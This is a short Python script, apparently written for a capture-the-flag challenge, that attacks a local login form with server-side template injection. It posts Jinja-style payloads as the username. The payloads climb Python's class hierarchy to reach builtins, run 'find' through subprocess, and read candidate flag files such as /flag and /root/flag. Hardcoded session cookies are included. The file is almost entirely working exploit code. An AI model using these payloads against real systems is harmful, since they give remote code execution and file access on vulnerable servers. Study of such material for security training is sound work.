import requests
import re
import time

# Simple configuration
url = "http://127.0.0.1:33149/accounts/login"
session = requests.Session()
session.cookies.set('csrftoken', 'jqE7iouiUCsy1EBJ5An435pWHCysGJD4')
session.cookies.set('sessionid', '66u2wxpmyuyx2zfyxpyt7122z50a5vuy')

def quick_test(name, payload):
    try:
        # Get CSRF token
        r = session.get(url)
        csrf = re.search(r'value="([^"]+)"', r.text).group(1)
        
        # Post payload
        data = {'csrfmiddlewaretoken':csrf, 'username':payload, 'password':'test', 'login':'submit'}
        resp = session.post(url, data=data, headers={'Referer':url})
        
        # Check for FLAG
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"FLAG_FOUND:{flag.group(0)}")
            return True
        return False
    except:
        return False
    finally:
        time.sleep(0.5)

# Test basic SSTI
print("Test1:basic")
quick_test("basic", "{{''.__class__}}")

# Test finding FLAG files (index 138 is most common)
print("Test2:find_flag")
find_payload = "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['find','/','-name','FLAG*','2>/dev/null']).decode()}}"
found = quick_test("find_flag", find_payload)

# Try reading common FLAG locations
if not found:
    locations = ['/flag','/FLAG','/tmp/FLAG','/app/FLAG','/home/flag','/root/flag']
    for i, loc in enumerate(locations):
        print(f"Test3:read_{i}")
        read_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['open']('{loc}').read()}}}}"
        if quick_test(f"read_{i}", read_payload):
            break

# Try other indices
indices = [139,140,141,142,136,137]
for idx in indices:
    print(f"Test4:index_{idx}")
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/flag').read()}}}}"
    if quick_test(f"index_{idx}", payload):
        break

print("Complete")
